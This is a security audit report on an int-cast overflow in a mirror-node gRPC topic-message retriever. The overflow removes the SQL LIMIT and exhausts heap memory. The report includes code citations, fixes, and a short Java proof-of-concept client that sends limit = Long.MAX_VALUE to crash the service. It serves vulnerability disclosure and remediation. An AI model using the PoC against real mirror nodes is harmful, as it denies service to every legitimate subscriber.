Audit Report

## Title
Integer Overflow in `long`-to-`int` Cast Bypasses SQL LIMIT, Enabling Unbounded Heap Load via `getResultList()`

## Summary
An unprivileged gRPC client can send a `ConsensusTopicQuery` with `limit` set to any value in the range `(Integer.MAX_VALUE, Long.MAX_VALUE]`. The narrowing cast `(int) (filter.getLimit() - context.getTotal().get())` in `PollingTopicMessageRetriever.poll()` overflows to a negative value, which `Math.min()` then selects over `maxPageSize`. The resulting negative `pageSize` is forwarded to `findByFilter()` as the new filter's `limit`, where `hasLimit()` returns `false` (because `limit > 0` is false for `-1`), so `setMaxResults` is never called. Hibernate emits no SQL `LIMIT` clause, and `getResultList()` materialises every matching row into JVM heap memory at once.

## Finding Description

**No upper-bound on `limit` in `TopicMessageFilter`:**

`TopicMessageFilter.limit` carries only `@Min(0)` with no `@Max`. Any positive `long` value, including `Long.MAX_VALUE`, passes bean validation. [1](#0-0) 

**Controller maps raw protobuf `uint64` directly to the filter with no capping:**

`ConsensusController.toFilter()` passes `query.getLimit()` (a raw `long`) straight into the builder. [2](#0-1) 

**Integer overflow in `PollingTopicMessageRetriever.poll()` neutralises `maxPageSize`:**

```java
int limit = filter.hasLimit()
        ? (int) (filter.getLimit() - context.getTotal().get())   // line 69
        : Integer.MAX_VALUE;
int pageSize = Math.min(limit, context.getMaxPageSize());        // line 71
```

When `filter.getLimit()` is `Long.MAX_VALUE` (`0x7FFFFFFFFFFFFFFF`) and `context.getTotal()` is `0`, the narrowing cast `(int)(Long.MAX_VALUE - 0)` retains only the lower 32 bits: `0xFFFFFFFF = -1`. `Math.min(-1, maxPageSize)` then selects `-1` (since `-1 < any positive maxPageSize`), and `newFilter` is built with `limit = -1`. [3](#0-2) 

**`hasLimit()` returns `false` for the overflowed value, suppressing `setMaxResults`:**

`hasLimit()` is defined as `limit > 0`. With `limit = -1`, it returns `false`, so the `setMaxResults` branch in `findByFilter` is never entered and no SQL `LIMIT` clause is emitted. [4](#0-3) [5](#0-4) 

**Eager full-table load:**

`getResultList()` materialises the entire result set into a `java.util.List` in heap memory. The comment on this line explicitly acknowledges that `getResultStream()` was intentionally avoided, making the eager load a deliberate design choice that is now exploitable. [6](#0-5) 

**Reactive `take()` is too late:**

`TopicMessageServiceImpl` applies `flux.take(filter.getLimit())` only after the repository has already returned the fully-loaded list. Back-pressure cannot act on data already in heap. [7](#0-6) 

The same overflow pattern exists in `PollingTopicListener.poll()` on the live-message path. [8](#0-7) 

## Impact Explanation
A single malicious `subscribeTopic` call with `limit = Long.MAX_VALUE` and `startTime = 0` against a topic with a large number of historical messages will cause the JVM to attempt to allocate a `List` containing every matching row from the `topic_message` table. On a production mirror node with millions of HCS messages this reliably triggers `OutOfMemoryError`, crashing the gRPC process and terminating every in-flight stream for all legitimate subscribers. Because the gRPC service is stateless and the attack is repeatable, an attacker can keep the service unavailable indefinitely.

## Likelihood Explanation
The `subscribeTopic` gRPC endpoint is unauthenticated and publicly reachable. The protobuf field `limit` is `uint64`, so any standard gRPC client library can set it to `Long.MAX_VALUE` with a single line of code. No credentials, no special knowledge of the system, and no rate-limiting on the historical retrieval path are required. The attack is trivially repeatable and scriptable.

## Recommendation
1. **Add an `@Max` constraint** on `TopicMessageFilter.limit` (e.g., `@Max(Integer.MAX_VALUE)` or a domain-specific cap) so that values that would overflow `int` are rejected at validation time before reaching the retriever or repository.
2. **Replace the narrowing cast** in `PollingTopicMessageRetriever.poll()` and `PollingTopicListener.poll()` with a safe conversion, e.g.:
   ```java
   long remaining = filter.getLimit() - context.getTotal().get();
   int limit = (int) Math.min(remaining, Integer.MAX_VALUE);
   ```
3. **Cap `pageSize` to `maxPageSize` unconditionally** before building `newFilter`, ensuring a negative or zero computed limit falls back to a safe default rather than disabling the limit entirely.

## Proof of Concept
```java
// Standard gRPC client
ManagedChannel channel = ManagedChannelBuilder.forAddress("mirror-node-host", 5600)
        .usePlaintext()
        .build();
ConsensusServiceGrpc.ConsensusServiceBlockingStub stub =
        ConsensusServiceGrpc.newBlockingStub(channel);

ConsensusTopicQuery query = ConsensusTopicQuery.newBuilder()
        .setTopicID(TopicID.newBuilder().setTopicNum(1234).build())
        .setConsensusStartTime(Timestamp.newBuilder().setSeconds(0).build())
        .setLimit(Long.MAX_VALUE)   // overflows to -1 in PollingTopicMessageRetriever
        .build();

// This call triggers an unlimited SELECT on topic_message, loading every row into heap.
stub.subscribeTopic(query).forEachRemaining(r -> {});
```

**Overflow trace:**
- `filter.getLimit()` = `9223372036854775807L` (`Long.MAX_VALUE`)
- `(int)(9223372036854775807L - 0L)` = `(int)(0x7FFFFFFFFFFFFFFF)` = `0xFFFFFFFF` = `-1`
- `Math.min(-1, 1000)` = `-1` → `newFilter.limit = -1`
- `hasLimit()` → `false` → `setMaxResults` not called → no SQL `LIMIT`
- `getResultList()` loads all rows → `OutOfMemoryError`

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L25-26)
```java
    @Min(0)
    private long limit;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L39-41)
```java
    public boolean hasLimit() {
        return limit > 0;
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L55-56)
```java
    private TopicMessageFilter toFilter(ConsensusTopicQuery query) {
        final var filter = TopicMessageFilter.builder().limit(query.getLimit());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L68-75)
```java
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getTotal().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, context.getMaxPageSize());
        var startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        context.getPageSize().set(0L);

        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/repository/TopicMessageRepositoryCustomImpl.java (L51-53)
```java
        if (filter.hasLimit()) {
            typedQuery.setMaxResults((int) filter.getLimit());
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/repository/TopicMessageRepositoryCustomImpl.java (L60-60)
```java
        return typedQuery.getResultList().stream(); // getResultStream()'s cursor doesn't work with reactive streams
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L83-85)
```java
        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L54-59)
```java
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getCount().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();
```
